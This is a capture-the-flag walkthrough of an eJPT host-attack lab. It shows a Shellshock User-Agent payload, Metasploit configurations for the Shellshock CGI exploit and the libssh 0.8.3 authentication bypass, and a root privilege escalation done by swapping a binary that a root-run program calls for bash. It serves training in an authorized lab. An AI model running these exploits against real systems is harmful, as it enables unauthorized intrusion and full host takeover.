#  System-Host Based Attacks CTF 2 Walkthrough

## Overview

This walkthrough documents the methodology used to solve the **System-Host Based Attacks CTF 2** Skill Check Lab from the eJPT course. The objective was to perform host-based attacks against two target systems and capture four flags hidden throughout the environment.

> **Disclaimer:** This writeup is intended for educational purposes only and was conducted in an authorized training environment provided by INE/eLearnSecurity.

---

# Lab Environment

Two target systems were available:

* `target1.ine.local`
* `target2.ine.local`

The objectives were:

| Flag   | Objective                                                 |
| ------ | --------------------------------------------------------- |
| Flag 1 | Find a file in the root (`/`) directory on target1        |
| Flag 2 | Investigate `/opt/apache/htdocs/` on target1              |
| Flag 3 | Obtain user-level access on target2                       |
| Flag 4 | Escalate privileges and retrieve the root flag on target2 |

---

# Target 1 Enumeration

## Initial Nmap Scan

The first step was performing service enumeration against Target 1.

```bash
nmap -sV -sC -O -p- -v target1.ine.local
```

### Scan Objectives

* Discover open ports
* Identify running services
* Detect service versions
* Execute default NSE scripts
* Fingerprint the operating system

During enumeration, a CGI-enabled web service was identified.

---

# Identifying Shellshock Vulnerability

Because CGI functionality was exposed, I tested for the Shellshock vulnerability using the Nmap NSE script.

```bash
db_nmap -sV target1.ine.local \
--script=http-shellshock \
--script-args "http-shellshock.uri=/browser.cgi"
```
<img width="1407" height="663" alt="image" src="https://github.com/user-attachments/assets/db9cf43e-e580-4167-87e2-41d4976d378b" />

The script indicated that the target was vulnerable to **Shellshock (CVE-2014-6271)**.

## Proof of Concept

Shellshock allows attackers to inject commands into Bash through crafted HTTP headers when CGI scripts invoke Bash.

Example payload:

```http
User-Agent: () { :;}; /bin/bash -c "id"
```

Successful command execution confirmed the vulnerability.

---

# Exploitation

## Metasploit Module

Metasploit provides a dedicated module for exploiting vulnerable CGI applications.

```bash
use exploit/multi/http/apache_mod_cgi_bash_env_exec
```

### Configuration

```bash
set RHOSTS target1.ine.local
set TARGETURI /browser.cgi
run
```

The exploit successfully returned a command shell.

---

# Session Upgrade

For better stability and post-exploitation capabilities, I upgraded the shell to a Meterpreter session.

```bash
sessions -u 1
```

After the upgrade, interaction became significantly more reliable.

---

# Flag 1

With access established, I searched the root directory.

```bash
cd /
ls -la
```

A file containing the first flag was discovered and read.

```bash
cat <flag_file>
```
<img width="1049" height="748" alt="image" src="https://github.com/user-attachments/assets/c23233f8-f4e3-481f-b214-0dd5fa9370d2" />

Flag 1 successfully captured.

---

# Flag 2

The lab instructions hinted at hidden content inside the Apache document root.

## Directory Inspection

```bash
cd /opt/apache/htdocs/
find . -type f
```

Careful inspection of the directory structure revealed another file containing the second flag.

```bash
cat <flag_file>
```
<img width="1116" height="418" alt="image" src="https://github.com/user-attachments/assets/7c537476-d80a-4b51-87ce-2aa876a26224" />

Flag 2 successfully captured.

---

# Target 2 Enumeration

After completing Target 1, I began enumeration of Target 2.

```bash
db_nmap -sV -sC -O -p- -v target2.ine.local
```

The scan revealed an interesting SSH service:

```text
22/tcp open ssh
libssh 0.8.3
```

---

# Identifying libssh Authentication Bypass

The detected version was vulnerable to the famous libssh authentication bypass vulnerability.

## Verification

```bash
searchsploit libssh 0.8.3
```

Relevant exploits confirmed that the version was vulnerable.

---

# Exploitation Using Metasploit

Metasploit contains a scanner module for exploiting this issue.

```bash
use auxiliary/scanner/ssh/libssh_auth_bypass
```

## Configuration

```bash
set RHOSTS target2.ine.local
set RPORT 22
```

The first execution did not produce the expected result.

After reviewing the module documentation, I discovered that pseudo-terminal allocation was required.

```bash
set SPAWN_PTY true
run
```

This time the module successfully provided shell access.

---

# Flag 3

With user-level access established, I inspected the home directory.

```bash
pwd
ls -la
```

The third flag was located and retrieved.

```bash
cat <flag_file>
```
<img width="965" height="235" alt="image" src="https://github.com/user-attachments/assets/532a9311-7fd5-41b5-a29c-e08e2a22fe66" />

Flag 3 successfully captured.

---

# Privilege Escalation

To obtain the final flag, root privileges were required.

## Reconnaissance

During enumeration of the user's home directory, I discovered two interesting files:

```text
greetings
welcome
```

One file appeared to execute with elevated privileges.

### Permission Analysis

```bash
ls -la
```

The permissions indicated that `welcome` executed with root privileges.
<img width="965" height="235" alt="image" src="https://github.com/user-attachments/assets/1a66edc8-684b-4ca7-8d1d-9df8140581f6" />

---

# Binary Analysis

I investigated how the privileged program worked.

```bash
strings welcome
```

The binary appeared to invoke another executable named:

```text
greetings
```
<img width="620" height="220" alt="image" src="https://github.com/user-attachments/assets/fe2d7f37-9c7a-4e06-947a-53bdb3214658" />

This suggested a potential path or binary replacement vulnerability.

---

# Exploiting the Vulnerability

The privileged binary trusted and executed the external `greetings` file.

I replaced the original file with a copy of Bash.

## Step 1: Remove Existing Binary

```bash
rm greetings
```

## Step 2: Replace With Bash

```bash
cp /bin/bash greetings
chmod +x greetings
```

## Step 3: Execute Privileged Program

```bash
./welcome
```

Because `welcome` executed `greetings` with root privileges, a root shell was spawned.

---

# Proof of Concept

```bash
rm greetings
cp /bin/bash greetings
chmod +x greetings
./welcome
id
```

Output:

```text
uid=0(root) gid=0(root)
```

Root access successfully obtained.

---

# Flag 4

With root privileges acquired, accessing the root directory became trivial.

```bash
cd /root
ls
cat <flag_file>
```
<img width="593" height="232" alt="image" src="https://github.com/user-attachments/assets/7b720479-44e8-44b4-b7a6-765f5f2d17cb" />

The final flag was successfully captured.

---



Happy Hacking!
